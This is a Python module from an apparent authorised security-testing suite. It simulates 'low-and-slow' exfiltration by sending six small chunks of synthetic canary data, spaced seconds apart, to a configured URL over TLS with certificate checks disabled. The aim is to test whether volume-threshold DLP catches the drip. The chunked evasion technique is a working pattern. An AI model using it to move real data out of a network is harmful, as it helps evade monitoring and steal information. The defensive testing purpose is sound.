"""Family E — DLP: low-and-slow / chunked exfil under volume thresholds.

DLP and UEBA often key on volume and rate. This sends the marked synthetic canary
as a series of SMALL chunks spread over time (below a typical per-flow threshold) to
your canary_url, to test cumulative/volume-over-time DLP and per-user egress
baselining rather than single-payload signatures. If all chunks are accepted, the
threshold-based DLP did not catch the drip.

ACTIVE (--active) only — it runs for a short window. SAFE: synthetic marked data,
tiny total volume. Config: canary_url. MITRE T1030 (Data Transfer Size Limits) /
T1027.
"""
import ssl
import time
import uuid
from urllib.parse import urlparse
from modules import _util as U

META = {
    "id": "dlp_lowandslow",
    "name": "DLP Low-and-slow Exfil (chunked)",
    "category": "Exfiltration",
    "test_type": "attack_sim",
    "family": "E",
    "direction": "a2b",
    "added": True,
    "active": True,
    "control": "Cumulative/volume-over-time DLP; UEBA per-user egress baselines",
    "fix": "SD-WAN",
    "mitre": ["T1030", "T1027"],
    "tactic": "Exfiltration",
    "cwe": ["CWE-200"],
    "requires": [],
    "ports": [],
    "success_regex": r"^LOWSLOW-OK",
    "blocked_regex": r"low-and-slow blocked|not configured",
}


def _post_chunk(host, port, path, body, ctx):
    req = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: MyGovNet-USS/lowslow\r\n"
           "Content-Type: application/octet-stream\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n{body}")
    try:
        raw = U.connect(host, port, ctx, timeout=8)
        c = ssl.create_default_context()
        c.check_hostname = False
        c.verify_mode = ssl.CERT_NONE
        with c.wrap_socket(raw, server_hostname=host) as tls:
            tls.sendall(req.encode())
            resp = tls.recv(64).decode(errors="replace")
        return resp.startswith("HTTP/")
    except Exception:
        return False


def run(target, ctx):
    url = ctx.cfg("canary_url")
    out = ["# DLP low-and-slow exfil test (Family E) — synthetic marked data only"]
    if not url:
        out.append(U.skip("canary_url not configured."))
        return "\n".join(out)
    if not ctx.allow_active:
        out.append(U.skip("--active not set — low-and-slow runs over a time window; "
                          "enable with --active inside the authorised window."))
        return "\n".join(out)
    u = urlparse(url if "://" in url else "https://" + url)
    host, port, path = u.hostname, (u.port or 443), (u.path or "/")
    chunks = 6
    ok = 0
    marker = "MYGOVNET-USS-CANARY-SYNTHETIC-" + uuid.uuid4().hex
    out.append(f"[ACTIVE] sending {chunks} small chunks to {host} ~5s apart …")
    for i in range(chunks):
        body = f"{marker}:chunk{i}:" + ("D" * 200)   # ~200B/chunk (under thresholds)
        if _post_chunk(host, port, path, body, ctx):
            ok += 1
            out.append(f"  chunk {i+1}/{chunks}: accepted")
        else:
            out.append(f"  chunk {i+1}/{chunks}: blocked/failed")
        time.sleep(5)
    out.append("")
    if ok == chunks:
        out.append(f"LOWSLOW-OK — all {chunks} low-and-slow chunks were exfiltrated. "
                   "[FINDING] cumulative/volume-over-time DLP + UEBA did not catch the drip.")
    elif ok:
        out.append(f"partial — {ok}/{chunks} chunks got out; threshold DLP caught some. REVIEW.")
    else:
        out.append("low-and-slow blocked — no chunks exfiltrated (DLP holding)")
    return "\n".join(out)
